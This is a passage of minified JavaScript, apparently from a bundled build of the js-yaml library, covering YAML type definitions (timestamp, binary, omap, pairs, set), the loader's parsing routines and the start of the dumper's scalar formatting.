n=e.toString(10),R.test(n)?n.replace("e",".e"):n},defaultStyle:"lowercase"}),F=S.extend({implicit:[C,A,E,O]}),I=F,M=new RegExp("^([0-9][0-9][0-9][0-9])-([0-9][0-9])-([0-9][0-9])$"),D=new RegExp("^([0-9][0-9][0-9][0-9])-([0-9][0-9]?)-([0-9][0-9]?)(?:[Tt]|[ \\t]+)([0-9][0-9]?):([0-9][0-9]):([0-9][0-9])(?:\\.([0-9]*))?(?:[ \\t]*(Z|([-+])([0-9][0-9]?)(?::([0-9][0-9]))?))?$");var _=new v("tag:yaml.org,2002:timestamp",{kind:"scalar",resolve:function(e){return null!==e&&(null!==M.exec(e)||null!==D.exec(e))},construct:function(e){var t,n,r,a,i,s,o,l,c=0,u=null;if(null===(t=M.exec(e))&&(t=D.exec(e)),null===t)throw new Error("Date resolve error");if(n=+t[1],r=+t[2]-1,a=+t[3],!t[4])return new Date(Date.UTC(n,r,a));if(i=+t[4],s=+t[5],o=+t[6],t[7]){for(c=t[7].slice(0,3);c.length<3;)c+="0";c=+c}return t[9]&&(u=6e4*(60*+t[10]+ +(t[11]||0)),"-"===t[9]&&(u=-u)),l=new Date(Date.UTC(n,r,a,i,s,o,c)),u&&l.setTime(l.getTime()-u),l},instanceOf:Date,represent:function(e){return e.toISOString()}});var B=new v("tag:yaml.org,2002:merge",{kind:"scalar",resolve:function(e){return"<<"===e||null===e}}),z="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\n\r";var W=new v("tag:yaml.org,2002:binary",{kind:"scalar",resolve:function(e){if(null===e)return!1;var t,n,r=0,a=e.length,i=z;for(n=0;n<a;n++)if(!((t=i.indexOf(e.charAt(n)))>64)){if(t<0)return!1;r+=6}return r%8===0},construct:function(e){var t,n,r=e.replace(/[\r\n=]/g,""),a=r.length,i=z,s=0,o=[];for(t=0;t<a;t++)t%4===0&&t&&(o.push(s>>16&255),o.push(s>>8&255),o.push(255&s)),s=s<<6|i.indexOf(r.charAt(t));return 0===(n=a%4*6)?(o.push(s>>16&255),o.push(s>>8&255),o.push(255&s)):18===n?(o.push(s>>10&255),o.push(s>>2&255)):12===n&&o.push(s>>4&255),new Uint8Array(o)},predicate:function(e){return"[object Uint8Array]"===Object.prototype.toString.call(e)},represent:function(e){var t,n,r="",a=0,i=e.length,s=z;for(t=0;t<i;t++)t%3===0&&t&&(r+=s[a>>18&63],r+=s[a>>12&63],r+=s[a>>6&63],r+=s[63&a]),a=(a<<8)+e[t];return 0===(n=i%3)?(r+=s[a>>18&63],r+=s[a>>12&63],r+=s[a>>6&63],r+=s[63&a]):2===n?(r+=s[a>>10&63],r+=s[a>>4&63],r+=s[a<<2&63],r+=s[64]):1===n&&(r+=s[a>>2&63],r+=s[a<<4&63],r+=s[64],r+=s[64]),r}}),H=Object.prototype.hasOwnProperty,U=Object.prototype.toString;var V=new v("tag:yaml.org,2002:omap",{kind:"sequence",resolve:function(e){if(null===e)return!0;var t,n,r,a,i,s=[],o=e;for(t=0,n=o.length;t<n;t+=1){if(r=o[t],i=!1,"[object Object]"!==U.call(r))return!1;for(a in r)if(H.call(r,a)){if(i)return!1;i=!0}if(!i)return!1;if(-1!==s.indexOf(a))return!1;s.push(a)}return!0},construct:function(e){return null!==e?e:[]}}),$=Object.prototype.toString;var G=new v("tag:yaml.org,2002:pairs",{kind:"sequence",resolve:function(e){if(null===e)return!0;var t,n,r,a,i,s=e;for(i=new Array(s.length),t=0,n=s.length;t<n;t+=1){if(r=s[t],"[object Object]"!==$.call(r))return!1;if(1!==(a=Object.keys(r)).length)return!1;i[t]=[a[0],r[a[0]]]}return!0},construct:function(e){if(null===e)return[];var t,n,r,a,i,s=e;for(i=new Array(s.length),t=0,n=s.length;t<n;t+=1)r=s[t],a=Object.keys(r),i[t]=[a[0],r[a[0]]];return i}}),Q=Object.prototype.hasOwnProperty;var K=new v("tag:yaml.org,2002:set",{kind:"mapping",resolve:function(e){if(null===e)return!0;var t,n=e;for(t in n)if(Q.call(n,t)&&null!==n[t])return!1;return!0},construct:function(e){return null!==e?e:{}}}),Y=I.extend({implicit:[_,B],explicit:[W,V,G,K]}),X=Object.prototype.hasOwnProperty,J=/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F-\x84\x86-\x9F\uFFFE\uFFFF]|[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?:[^\uD800-\uDBFF]|^)[\uDC00-\uDFFF]/,Z=/[\x85\u2028\u2029]/,ee=/[,\[\]\{\}]/,te=/^(?:!|!!|![a-z\-]+!)$/i,ne=/^(?:!|[^,\[\]\{\}])(?:%[0-9a-f]{2}|[0-9a-z\-#;\/\?:@&=\+\$,_\.!~\*'\(\)\[\]])*$/i;function re(e){return Object.prototype.toString.call(e)}function ae(e){return 10===e||13===e}function ie(e){return 9===e||32===e}function se(e){return 9===e||32===e||10===e||13===e}function oe(e){return 44===e||91===e||93===e||123===e||125===e}function le(e){var t;return 48<=e&&e<=57?e-48:97<=(t=32|e)&&t<=102?t-97+10:-1}function ce(e){return 120===e?2:117===e?4:85===e?8:0}function ue(e){return 48<=e&&e<=57?e-48:-1}function de(e){return 48===e?"\0":97===e?"\x07":98===e?"\b":116===e||9===e?"\t":110===e?"\n":118===e?"\v":102===e?"\f":114===e?"\r":101===e?"\x1b":32===e?" ":34===e?'"':47===e?"/":92===e?"\\":78===e?"\x85":95===e?"\xa0":76===e?"\u2028":80===e?"\u2029":""}function pe(e){return e<=65535?String.fromCharCode(e):String.fromCharCode(55296+(e-65536>>10),56320+(e-65536&1023))}function he(e,t,n){"__proto__"===t?Object.defineProperty(e,t,{configurable:!0,enumerable:!0,writable:!0,value:n}):e[t]=n}for(var fe=new Array(256),me=new Array(256),ge=0;ge<256;ge++)fe[ge]=de(ge)?1:0,me[ge]=de(ge);function ye(e,t){this.input=e,this.filename=t.filename||null,this.schema=t.schema||Y,this.onWarning=t.onWarning||null,this.legacy=t.legacy||!1,this.json=t.json||!1,this.listener=t.listener||null,this.implicitTypes=this.schema.compiledImplicit,this.typeMap=this.schema.compiledTypeMap,this.length=e.length,this.position=0,this.line=0,this.lineStart=0,this.lineIndent=0,this.firstTabInLine=-1,this.documents=[]}function ve(e,t){var n={name:e.filename,buffer:e.input.slice(0,-1),position:e.position,line:e.line,column:e.position-e.lineStart};return n.snippet=m(n),new p(t,n)}function xe(e,t){throw ve(e,t)}function be(e,t){e.onWarning&&e.onWarning.call(null,ve(e,t))}var we={YAML:function(e,t,n){var r,a,i;null!==e.version&&xe(e,"duplication of %YAML directive"),1!==n.length&&xe(e,"YAML directive accepts exactly one argument"),null===(r=/^([0-9]+)\.([0-9]+)$/.exec(n[0]))&&xe(e,"ill-formed argument of the YAML directive"),a=parseInt(r[1],10),i=parseInt(r[2],10),1!==a&&xe(e,"unacceptable YAML version of the document"),e.version=n[0],e.checkLineBreaks=i<2,1!==i&&2!==i&&be(e,"unsupported YAML version of the document")},TAG:function(e,t,n){var r,a;2!==n.length&&xe(e,"TAG directive accepts exactly two arguments"),r=n[0],a=n[1],te.test(r)||xe(e,"ill-formed tag handle (first argument) of the TAG directive"),X.call(e.tagMap,r)&&xe(e,'there is a previously declared suffix for "'+r+'" tag handle'),ne.test(a)||xe(e,"ill-formed tag prefix (second argument) of the TAG directive");try{a=decodeURIComponent(a)}catch(i){xe(e,"tag prefix is malformed: "+a)}e.tagMap[r]=a}};function ke(e,t,n,r){var a,i,s,o;if(t<n){if(o=e.input.slice(t,n),r)for(a=0,i=o.length;a<i;a+=1)9===(s=o.charCodeAt(a))||32<=s&&s<=1114111||xe(e,"expected valid JSON character");else J.test(o)&&xe(e,"the stream contains non-printable characters");e.result+=o}}function je(e,t,n,r){var a,i,s,o;for(c.isObject(n)||xe(e,"cannot merge mappings; the provided source object is unacceptable"),s=0,o=(a=Object.keys(n)).length;s<o;s+=1)i=a[s],X.call(t,i)||(he(t,i,n[i]),r[i]=!0)}function Ne(e,t,n,r,a,i,s,o,l){var c,u;if(Array.isArray(a))for(c=0,u=(a=Array.prototype.slice.call(a)).length;c<u;c+=1)Array.isArray(a[c])&&xe(e,"nested arrays are not supported inside keys"),"object"===typeof a&&"[object Object]"===re(a[c])&&(a[c]="[object Object]");if("object"===typeof a&&"[object Object]"===re(a)&&(a="[object Object]"),a=String(a),null===t&&(t={}),"tag:yaml.org,2002:merge"===r)if(Array.isArray(i))for(c=0,u=i.length;c<u;c+=1)je(e,t,i[c],n);else je(e,t,i,n);else e.json||X.call(n,a)||!X.call(t,a)||(e.line=s||e.line,e.lineStart=o||e.lineStart,e.position=l||e.position,xe(e,"duplicated mapping key")),he(t,a,i),delete n[a];return t}function Se(e){var t;10===(t=e.input.charCodeAt(e.position))?e.position++:13===t?(e.position++,10===e.input.charCodeAt(e.position)&&e.position++):xe(e,"a line break is expected"),e.line+=1,e.lineStart=e.position,e.firstTabInLine=-1}function Ce(e,t,n){for(var r=0,a=e.input.charCodeAt(e.position);0!==a;){for(;ie(a);)9===a&&-1===e.firstTabInLine&&(e.firstTabInLine=e.position),a=e.input.charCodeAt(++e.position);if(t&&35===a)do{a=e.input.charCodeAt(++e.position)}while(10!==a&&13!==a&&0!==a);if(!ae(a))break;for(Se(e),a=e.input.charCodeAt(e.position),r++,e.lineIndent=0;32===a;)e.lineIndent++,a=e.input.charCodeAt(++e.position)}return-1!==n&&0!==r&&e.lineIndent<n&&be(e,"deficient indentation"),r}function Ae(e){var t,n=e.position;return!(45!==(t=e.input.charCodeAt(n))&&46!==t||t!==e.input.charCodeAt(n+1)||t!==e.input.charCodeAt(n+2)||(n+=3,0!==(t=e.input.charCodeAt(n))&&!se(t)))}function Pe(e,t){1===t?e.result+=" ":t>1&&(e.result+=c.repeat("\n",t-1))}function Te(e,t){var n,r,a=e.tag,i=e.anchor,s=[],o=!1;if(-1!==e.firstTabInLine)return!1;for(null!==e.anchor&&(e.anchorMap[e.anchor]=s),r=e.input.charCodeAt(e.position);0!==r&&(-1!==e.firstTabInLine&&(e.position=e.firstTabInLine,xe(e,"tab characters must not be used in indentation")),45===r)&&se(e.input.charCodeAt(e.position+1));)if(o=!0,e.position++,Ce(e,!0,-1)&&e.lineIndent<=t)s.push(null),r=e.input.charCodeAt(e.position);else if(n=e.line,Le(e,t,3,!1,!0),s.push(e.result),Ce(e,!0,-1),r=e.input.charCodeAt(e.position),(e.line===n||e.lineIndent>t)&&0!==r)xe(e,"bad indentation of a sequence entry");else if(e.lineIndent<t)break;return!!o&&(e.tag=a,e.anchor=i,e.kind="sequence",e.result=s,!0)}function qe(e){var t,n,r,a,i=!1,s=!1;if(33!==(a=e.input.charCodeAt(e.position)))return!1;if(null!==e.tag&&xe(e,"duplication of a tag property"),60===(a=e.input.charCodeAt(++e.position))?(i=!0,a=e.input.charCodeAt(++e.position)):33===a?(s=!0,n="!!",a=e.input.charCodeAt(++e.position)):n="!",t=e.position,i){do{a=e.input.charCodeAt(++e.position)}while(0!==a&&62!==a);e.position<e.length?(r=e.input.slice(t,e.position),a=e.input.charCodeAt(++e.position)):xe(e,"unexpected end of the stream within a verbatim tag")}else{for(;0!==a&&!se(a);)33===a&&(s?xe(e,"tag suffix cannot contain exclamation marks"):(n=e.input.slice(t-1,e.position+1),te.test(n)||xe(e,"named tag handle cannot contain such characters"),s=!0,t=e.position+1)),a=e.input.charCodeAt(++e.position);r=e.input.slice(t,e.position),ee.test(r)&&xe(e,"tag suffix cannot contain flow indicator characters")}r&&!ne.test(r)&&xe(e,"tag name cannot contain such characters: "+r);try{r=decodeURIComponent(r)}catch(o){xe(e,"tag name is malformed: "+r)}return i?e.tag=r:X.call(e.tagMap,n)?e.tag=e.tagMap[n]+r:"!"===n?e.tag="!"+r:"!!"===n?e.tag="tag:yaml.org,2002:"+r:xe(e,'undeclared tag handle "'+n+'"'),!0}function Ee(e){var t,n;if(38!==(n=e.input.charCodeAt(e.position)))return!1;for(null!==e.anchor&&xe(e,"duplication of an anchor property"),n=e.input.charCodeAt(++e.position),t=e.position;0!==n&&!se(n)&&!oe(n);)n=e.input.charCodeAt(++e.position);return e.position===t&&xe(e,"name of an anchor node must contain at least one character"),e.anchor=e.input.slice(t,e.position),!0}function Le(e,t,n,r,a){var i,s,o,l,u,d,p,h,f,m=1,g=!1,y=!1;if(null!==e.listener&&e.listener("open",e),e.tag=null,e.anchor=null,e.kind=null,e.result=null,i=s=o=4===n||3===n,r&&Ce(e,!0,-1)&&(g=!0,e.lineIndent>t?m=1:e.lineIndent===t?m=0:e.lineIndent<t&&(m=-1)),1===m)for(;qe(e)||Ee(e);)Ce(e,!0,-1)?(g=!0,o=i,e.lineIndent>t?m=1:e.lineIndent===t?m=0:e.lineIndent<t&&(m=-1)):o=!1;if(o&&(o=g||a),1!==m&&4!==n||(h=1===n||2===n?t:t+1,f=e.position-e.lineStart,1===m?o&&(Te(e,f)||function(e,t,n){var r,a,i,s,o,l,c,u=e.tag,d=e.anchor,p={},h=Object.create(null),f=null,m=null,g=null,y=!1,v=!1;if(-1!==e.firstTabInLine)return!1;for(null!==e.anchor&&(e.anchorMap[e.anchor]=p),c=e.input.charCodeAt(e.position);0!==c;){if(y||-1===e.firstTabInLine||(e.position=e.firstTabInLine,xe(e,"tab characters must not be used in indentation")),r=e.input.charCodeAt(e.position+1),i=e.line,63!==c&&58!==c||!se(r)){if(s=e.line,o=e.lineStart,l=e.position,!Le(e,n,2,!1,!0))break;if(e.line===i){for(c=e.input.charCodeAt(e.position);ie(c);)c=e.input.charCodeAt(++e.position);if(58===c)se(c=e.input.charCodeAt(++e.position))||xe(e,"a whitespace character is expected after the key-value separator within a block mapping"),y&&(Ne(e,p,h,f,m,null,s,o,l),f=m=g=null),v=!0,y=!1,a=!1,f=e.tag,m=e.result;else{if(!v)return e.tag=u,e.anchor=d,!0;xe(e,"can not read an implicit mapping pair; a colon is missed")}}else{if(!v)return e.tag=u,e.anchor=d,!0;xe(e,"can not read a block mapping entry; a multiline key may not be an implicit key")}}else 63===c?(y&&(Ne(e,p,h,f,m,null,s,o,l),f=m=g=null),v=!0,y=!0,a=!0):y?(y=!1,a=!0):xe(e,"incomplete explicit mapping pair; a key node is missed; or followed by a non-tabulated empty line"),e.position+=1,c=r;if((e.line===i||e.lineIndent>t)&&(y&&(s=e.line,o=e.lineStart,l=e.position),Le(e,t,4,!0,a)&&(y?m=e.result:g=e.result),y||(Ne(e,p,h,f,m,g,s,o,l),f=m=g=null),Ce(e,!0,-1),c=e.input.charCodeAt(e.position)),(e.line===i||e.lineIndent>t)&&0!==c)xe(e,"bad indentation of a mapping entry");else if(e.lineIndent<t)break}return y&&Ne(e,p,h,f,m,null,s,o,l),v&&(e.tag=u,e.anchor=d,e.kind="mapping",e.result=p),v}(e,f,h))||function(e,t){var n,r,a,i,s,o,l,c,u,d,p,h,f=!0,m=e.tag,g=e.anchor,y=Object.create(null);if(91===(h=e.input.charCodeAt(e.position)))s=93,c=!1,i=[];else{if(123!==h)return!1;s=125,c=!0,i={}}for(null!==e.anchor&&(e.anchorMap[e.anchor]=i),h=e.input.charCodeAt(++e.position);0!==h;){if(Ce(e,!0,t),(h=e.input.charCodeAt(e.position))===s)return e.position++,e.tag=m,e.anchor=g,e.kind=c?"mapping":"sequence",e.result=i,!0;f?44===h&&xe(e,"expected the node content, but found ','"):xe(e,"missed comma between flow collection entries"),p=null,o=l=!1,63===h&&se(e.input.charCodeAt(e.position+1))&&(o=l=!0,e.position++,Ce(e,!0,t)),n=e.line,r=e.lineStart,a=e.position,Le(e,t,1,!1,!0),d=e.tag,u=e.result,Ce(e,!0,t),h=e.input.charCodeAt(e.position),!l&&e.line!==n||58!==h||(o=!0,h=e.input.charCodeAt(++e.position),Ce(e,!0,t),Le(e,t,1,!1,!0),p=e.result),c?Ne(e,i,y,d,u,p,n,r,a):o?i.push(Ne(e,null,y,d,u,p,n,r,a)):i.push(u),Ce(e,!0,t),44===(h=e.input.charCodeAt(e.position))?(f=!0,h=e.input.charCodeAt(++e.position)):f=!1}xe(e,"unexpected end of the stream within a flow collection")}(e,h)?y=!0:(s&&function(e,t){var n,r,a,i,s=1,o=!1,l=!1,u=t,d=0,p=!1;if(124===(i=e.input.charCodeAt(e.position)))r=!1;else{if(62!==i)return!1;r=!0}for(e.kind="scalar",e.result="";0!==i;)if(43===(i=e.input.charCodeAt(++e.position))||45===i)1===s?s=43===i?3:2:xe(e,"repeat of a chomping mode identifier");else{if(!((a=ue(i))>=0))break;0===a?xe(e,"bad explicit indentation width of a block scalar; it cannot be less than one"):l?xe(e,"repeat of an indentation width identifier"):(u=t+a-1,l=!0)}if(ie(i)){do{i=e.input.charCodeAt(++e.position)}while(ie(i));if(35===i)do{i=e.input.charCodeAt(++e.position)}while(!ae(i)&&0!==i)}for(;0!==i;){for(Se(e),e.lineIndent=0,i=e.input.charCodeAt(e.position);(!l||e.lineIndent<u)&&32===i;)e.lineIndent++,i=e.input.charCodeAt(++e.position);if(!l&&e.lineIndent>u&&(u=e.lineIndent),ae(i))d++;else{if(e.lineIndent<u){3===s?e.result+=c.repeat("\n",o?1+d:d):1===s&&o&&(e.result+="\n");break}for(r?ie(i)?(p=!0,e.result+=c.repeat("\n",o?1+d:d)):p?(p=!1,e.result+=c.repeat("\n",d+1)):0===d?o&&(e.result+=" "):e.result+=c.repeat("\n",d):e.result+=c.repeat("\n",o?1+d:d),o=!0,l=!0,d=0,n=e.position;!ae(i)&&0!==i;)i=e.input.charCodeAt(++e.position);ke(e,n,e.position,!1)}}return!0}(e,h)||function(e,t){var n,r,a;if(39!==(n=e.input.charCodeAt(e.position)))return!1;for(e.kind="scalar",e.result="",e.position++,r=a=e.position;0!==(n=e.input.charCodeAt(e.position));)if(39===n){if(ke(e,r,e.position,!0),39!==(n=e.input.charCodeAt(++e.position)))return!0;r=e.position,e.position++,a=e.position}else ae(n)?(ke(e,r,a,!0),Pe(e,Ce(e,!1,t)),r=a=e.position):e.position===e.lineStart&&Ae(e)?xe(e,"unexpected end of the document within a single quoted scalar"):(e.position++,a=e.position);xe(e,"unexpected end of the stream within a single quoted scalar")}(e,h)||function(e,t){var n,r,a,i,s,o;if(34!==(o=e.input.charCodeAt(e.position)))return!1;for(e.kind="scalar",e.result="",e.position++,n=r=e.position;0!==(o=e.input.charCodeAt(e.position));){if(34===o)return ke(e,n,e.position,!0),e.position++,!0;if(92===o){if(ke(e,n,e.position,!0),ae(o=e.input.charCodeAt(++e.position)))Ce(e,!1,t);else if(o<256&&fe[o])e.result+=me[o],e.position++;else if((s=ce(o))>0){for(a=s,i=0;a>0;a--)(s=le(o=e.input.charCodeAt(++e.position)))>=0?i=(i<<4)+s:xe(e,"expected hexadecimal character");e.result+=pe(i),e.position++}else xe(e,"unknown escape sequence");n=r=e.position}else ae(o)?(ke(e,n,r,!0),Pe(e,Ce(e,!1,t)),n=r=e.position):e.position===e.lineStart&&Ae(e)?xe(e,"unexpected end of the document within a double quoted scalar"):(e.position++,r=e.position)}xe(e,"unexpected end of the stream within a double quoted scalar")}(e,h)?y=!0:!function(e){var t,n,r;if(42!==(r=e.input.charCodeAt(e.position)))return!1;for(r=e.input.charCodeAt(++e.position),t=e.position;0!==r&&!se(r)&&!oe(r);)r=e.input.charCodeAt(++e.position);return e.position===t&&xe(e,"name of an alias node must contain at least one character"),n=e.input.slice(t,e.position),X.call(e.anchorMap,n)||xe(e,'unidentified alias "'+n+'"'),e.result=e.anchorMap[n],Ce(e,!0,-1),!0}(e)?function(e,t,n){var r,a,i,s,o,l,c,u,d=e.kind,p=e.result;if(se(u=e.input.charCodeAt(e.position))||oe(u)||35===u||38===u||42===u||33===u||124===u||62===u||39===u||34===u||37===u||64===u||96===u)return!1;if((63===u||45===u)&&(se(r=e.input.charCodeAt(e.position+1))||n&&oe(r)))return!1;for(e.kind="scalar",e.result="",a=i=e.position,s=!1;0!==u;){if(58===u){if(se(r=e.input.charCodeAt(e.position+1))||n&&oe(r))break}else if(35===u){if(se(e.input.charCodeAt(e.position-1)))break}else{if(e.position===e.lineStart&&Ae(e)||n&&oe(u))break;if(ae(u)){if(o=e.line,l=e.lineStart,c=e.lineIndent,Ce(e,!1,-1),e.lineIndent>=t){s=!0,u=e.input.charCodeAt(e.position);continue}e.position=i,e.line=o,e.lineStart=l,e.lineIndent=c;break}}s&&(ke(e,a,i,!1),Pe(e,e.line-o),a=i=e.position,s=!1),ie(u)||(i=e.position+1),u=e.input.charCodeAt(++e.position)}return ke(e,a,i,!1),!!e.result||(e.kind=d,e.result=p,!1)}(e,h,1===n)&&(y=!0,null===e.tag&&(e.tag="?")):(y=!0,null===e.tag&&null===e.anchor||xe(e,"alias node should not have any properties")),null!==e.anchor&&(e.anchorMap[e.anchor]=e.result)):0===m&&(y=o&&Te(e,f))),null===e.tag)null!==e.anchor&&(e.anchorMap[e.anchor]=e.result);else if("?"===e.tag){for(null!==e.result&&"scalar"!==e.kind&&xe(e,'unacceptable node kind for !<?> tag; it should be "scalar", not "'+e.kind+'"'),l=0,u=e.implicitTypes.length;l<u;l+=1)if((p=e.implicitTypes[l]).resolve(e.result)){e.result=p.construct(e.result),e.tag=p.tag,null!==e.anchor&&(e.anchorMap[e.anchor]=e.result);break}}else if("!"!==e.tag){if(X.call(e.typeMap[e.kind||"fallback"],e.tag))p=e.typeMap[e.kind||"fallback"][e.tag];else for(p=null,l=0,u=(d=e.typeMap.multi[e.kind||"fallback"]).length;l<u;l+=1)if(e.tag.slice(0,d[l].tag.length)===d[l].tag){p=d[l];break}p||xe(e,"unknown tag !<"+e.tag+">"),null!==e.result&&p.kind!==e.kind&&xe(e,"unacceptable node kind for !<"+e.tag+'> tag; it should be "'+p.kind+'", not "'+e.kind+'"'),p.resolve(e.result,e.tag)?(e.result=p.construct(e.result,e.tag),null!==e.anchor&&(e.anchorMap[e.anchor]=e.result)):xe(e,"cannot resolve a node with !<"+e.tag+"> explicit tag")}return null!==e.listener&&e.listener("close",e),null!==e.tag||null!==e.anchor||y}function Re(e){var t,n,r,a,i=e.position,s=!1;for(e.version=null,e.checkLineBreaks=e.legacy,e.tagMap=Object.create(null),e.anchorMap=Object.create(null);0!==(a=e.input.charCodeAt(e.position))&&(Ce(e,!0,-1),a=e.input.charCodeAt(e.position),!(e.lineIndent>0||37!==a));){for(s=!0,a=e.input.charCodeAt(++e.position),t=e.position;0!==a&&!se(a);)a=e.input.charCodeAt(++e.position);for(r=[],(n=e.input.slice(t,e.position)).length<1&&xe(e,"directive name must not be less than one character in length");0!==a;){for(;ie(a);)a=e.input.charCodeAt(++e.position);if(35===a){do{a=e.input.charCodeAt(++e.position)}while(0!==a&&!ae(a));break}if(ae(a))break;for(t=e.position;0!==a&&!se(a);)a=e.input.charCodeAt(++e.position);r.push(e.input.slice(t,e.position))}0!==a&&Se(e),X.call(we,n)?we[n](e,n,r):be(e,'unknown document directive "'+n+'"')}Ce(e,!0,-1),0===e.lineIndent&&45===e.input.charCodeAt(e.position)&&45===e.input.charCodeAt(e.position+1)&&45===e.input.charCodeAt(e.position+2)?(e.position+=3,Ce(e,!0,-1)):s&&xe(e,"directives end mark is expected"),Le(e,e.lineIndent-1,4,!1,!0),Ce(e,!0,-1),e.checkLineBreaks&&Z.test(e.input.slice(i,e.position))&&be(e,"non-ASCII line breaks are interpreted as content"),e.documents.push(e.result),e.position===e.lineStart&&Ae(e)?46===e.input.charCodeAt(e.position)&&(e.position+=3,Ce(e,!0,-1)):e.position<e.length-1&&xe(e,"end of the stream or a document separator is expected")}function Oe(e,t){t=t||{},0!==(e=String(e)).length&&(10!==e.charCodeAt(e.length-1)&&13!==e.charCodeAt(e.length-1)&&(e+="\n"),65279===e.charCodeAt(0)&&(e=e.slice(1)));var n=new ye(e,t),r=e.indexOf("\0");for(-1!==r&&(n.position=r,xe(n,"null byte is not allowed in input")),n.input+="\0";32===n.input.charCodeAt(n.position);)n.lineIndent+=1,n.position+=1;for(;n.position<n.length-1;)Re(n);return n.documents}var Fe={loadAll:function(e,t,n){null!==t&&"object"===typeof t&&"undefined"===typeof n&&(n=t,t=null);var r=Oe(e,n);if("function"!==typeof t)return r;for(var a=0,i=r.length;a<i;a+=1)t(r[a])},load:function(e,t){var n=Oe(e,t);if(0!==n.length){if(1===n.length)return n[0];throw new p("expected a single document in the stream, but found more")}}},Ie=Object.prototype.toString,Me=Object.prototype.hasOwnProperty,De=65279,_e={0:"\\0",7:"\\a",8:"\\b",9:"\\t",10:"\\n",11:"\\v",12:"\\f",13:"\\r",27:"\\e",34:'\\"',92:"\\\\",133:"\\N",160:"\\_",8232:"\\L",8233:"\\P"},Be=["y","Y","yes","Yes","YES","on","On","ON","n","N","no","No","NO","off","Off","OFF"],ze=/^[-+]?[0-9_]+(?::[0-9_]+)+(?:\.[0-9_]*)?$/;function We(e){var t,n,r;if(t=e.toString(16).toUpperCase(),e<=255)n="x",r=2;else if(e<=65535)n="u",r=4;else{if(!(e<=4294967295))throw new p("code point within a string may not be greater than 0xFFFFFFFF");n="U",r=8}return"\\"+n+c.repeat("0",r-t.length)+t}function He(e){this.schema=e.schema||Y,this.indent=Math.max(1,e.indent||2),this.noArrayIndent=e.noArrayIndent||!1,this.skipInvalid=e.skipInvalid||!1,this.flowLevel=c.isNothing(e.flowLevel)?-1:e.flowLevel,this.styleMap=function(e,t){var n,r,a,i,s,o,l;if(null===t)return{};for(n={},a=0,i=(r=Object.keys(t)).length;a<i;a+=1)s=r[a],o=String(t[s]),"!!"===s.slice(0,2)&&(s="tag:yaml.org,2002:"+s.slice(2)),(l=e.compiledTypeMap.fallback[s])&&Me.call(l.styleAliases,o)&&(o=l.styleAliases[o]),n[s]=o;return n}(this.schema,e.styles||null),this.sortKeys=e.sortKeys||!1,this.lineWidth=e.lineWidth||80,this.noRefs=e.noRefs||!1,this.noCompatMode=e.noCompatMode||!1,this.condenseFlow=e.condenseFlow||!1,this.quotingType='"'===e.quotingType?2:1,this.forceQuotes=e.forceQuotes||!1,this.replacer="function"===typeof e.replacer?e.replacer:null,this.implicitTypes=this.schema.compiledImplicit,this.explicitTypes=this.schema.compiledExplicit,this.tag=null,this.result="",this.duplicates=[],this.usedDuplicates=null}function Ue(e,t){for(var n,r=c.repeat(" ",t),a=0,i=-1,s="",o=e.length;a<o;)-1===(i=e.indexOf("\n",a))?(n=e.slice(a),a=o):(n=e.slice(a,i+1),a=i+1),n.length&&"\n"!==n&&(s+=r),s+=n;return s}function Ve(e,t){return"\n"+c.repeat(" ",e.indent*t)}function $e(e){return 32===e||9===e}function Ge(e){return 32<=e&&e<=126||161<=e&&e<=55295&&8232!==e&&8233!==e||57344<=e&&e<=65533&&e!==De||65536<=e&&e<=1114111}function Qe(e){return Ge(e)&&e!==De&&13!==e&&10!==e}function Ke(e,t,n){var r=Qe(e),a=r&&!$e(e);return(n?r:r&&44!==e&&91!==e&&93!==e&&123!==e&&125!==e)&&35!==e&&!(58===t&&!a)||Qe(t)&&!$e(t)&&35===e||58===t&&a}function Ye(e,t){var n,r=e.charCodeAt(t);return r>=55296&&r<=56319&&t+1<e.length&&(n=e.charCodeAt(t+1))>=56320&&n<=57343?1024*(r-55296)+n-56320+65536:r}function Xe(e){return/^\n* /.test(e)}function Je(e,t,n,r,a,i,s,o){var l,c,u=0,d=null,p=!1,h=!1,f=-1!==r,m=-1,g=Ge(c=Ye(e,0))&&c!==De&&!$e(c)&&45!==c&&63!==c&&58!==c&&44!==c&&91!==c&&93!==c&&123!==c&&125!==c&&35!==c&&38!==c&&42!==c&&33!==c&&124!==c&&61!==c&&62!==c&&39!==c&&34!==c&&37!==c&&64!==c&&96!==c&&function(e){return!$e(e)&&58!==e}(Ye(e,e.length-1));if(t||s)for(l=0;l<e.length;u>=65536?l+=2:l++){if(!Ge(u=Ye(e,l)))return 5;g=g&&Ke(u,d,o),d=u}else{for(l=0;l<e.length;u>=65536?l+=2:l++){if(10===(u=Ye(e,l)))p=!0,f&&(h=h||l-m-1>r&&" "!==e[m+1],m=l);else if(!Ge(u))return 5;g=g&&Ke(u,d,o),d=u}h=h||f&&l-m-1>r&&" "!==e[m+1]}return p||h?n>9&&Xe(e)?5:s?2===i?5:2:h?4:3:!g||s||a(e)?2===i?5:2:1}function Ze(e,t,n,r,a){e.dump=function(){if(0===t.length)return 2===e.quotingType?'""':"''";if(!e.noCompatMode&&(-1!==Be.indexOf(t)||ze.test(t)))return 2===e.quotingType?'"'+t+'"':"'"+t+"'";var i=e.indent*Math.max(1,n),s=-1===e.lineWidth?-1:Math.max(Math.min(e.lineWidth,40),e.lineWidth-i),o=r||e.flowLevel>-1&&n>=e.flowLevel;switch(Je(t,o,e.indent,s,function(t){return function(e,t){var n,r;for(n=0,r=e.implicitTypes.length;n<r;n+=1)if(e.implicitTypes[n].resolve(t))return!0;return!1}(e,t)},e.quotingType,e.forceQuotes&&!r,a)){case 1:return t;case 2:return"'"+t.replace(/'/g,"''")+"'";case 3:return"|"+et(t,e.indent)+tt(Ue(t,i));case 4:return">"+et(t,e.indent)+tt(Ue(function(e,t){var n,r,a=/(\n+)([^\n]*)/g,i=function(){var n=e.indexOf("\n");return n=-1!==n?n:e.length,a.lastIndex=n,nt(e.slice(0,n),t)}(),s="\n"===e[0]||" "===e[0];for(;r=a.exec(e);){var o=r[1],l=r[2];n=" "===l[0],i+=o+(s||n||""===l?"":"\n")+nt(l,t),s=n}return i}(t,s),i));case 5:return'"'+function(e){for(var t,n="",r=0,a=0;a<e.length;r>=65536?a+=2:a++)r=Ye(e,a),!(t=_e[r])&&Ge(r)?(n+=e[a],r>=65536&&(n+=e[a+1])):n+=t||We(r);return n}(t)+'"';default:throw new p("impossible error: invalid scalar style")}}()}function et(e,t){var 